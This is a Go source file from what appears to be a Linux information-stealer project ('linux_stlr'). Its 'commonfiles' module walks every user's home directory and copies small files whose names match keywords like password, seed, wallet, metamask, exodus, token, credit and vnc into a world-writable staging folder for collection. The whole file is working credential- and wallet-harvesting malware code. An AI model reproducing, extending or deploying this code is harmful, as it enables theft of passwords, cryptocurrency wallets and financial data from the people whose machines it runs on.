package commonfiles

import (
	"linux_stlr/modules/system"
	"linux_stlr/utils/fileutil"
	"os"
	"path/filepath"
	"strings"
)

var keywords = []string{
	"account",
	"password",
	"passwords",
	"secret",
	"motdepass",
	"mot_de_pass",
	"login",
	"paypal",
	"seed",
	"bank",
	"metamask",
	"wallet",
	"crypto",
	"exodus",
	"atomic",
	"auth",
	"code",
	"token",
	"credit",
	"cred",
	"credentials",
	"card",
	"mail",
	"address",
	"phone",
	"number",
	"backup",
	"tightvnc",
	"vnc_viewer",
	"vnc",
	"ultravnc",
}

func Run(destinationdir string) {

	found := 0
	users, _ := system.GetUsers()
	for _, user := range users {
		if _, err := os.Stat(user); err != nil {
			continue
		}
		filepath.Walk(user, func(path string, info os.FileInfo, err error) error {
			if err != nil {
				return nil
			}
			if info.IsDir() {
				return nil
			}
			if info.Size() > 2*1024*1024 {
				return nil
			}
			for _, keyword := range keywords {
				if !strings.Contains(strings.ToLower(info.Name()), keyword) {
					continue
				}

				dest := filepath.Join(destinationdir, user, "commonfiles")
				os.MkdirAll(dest, os.FileMode(0777))
				err = fileutil.CopyFile(path, filepath.Join(dest, info.Name()))
				if err != nil {
					continue
				}
				found++
			}
			return nil
		})
	}
}
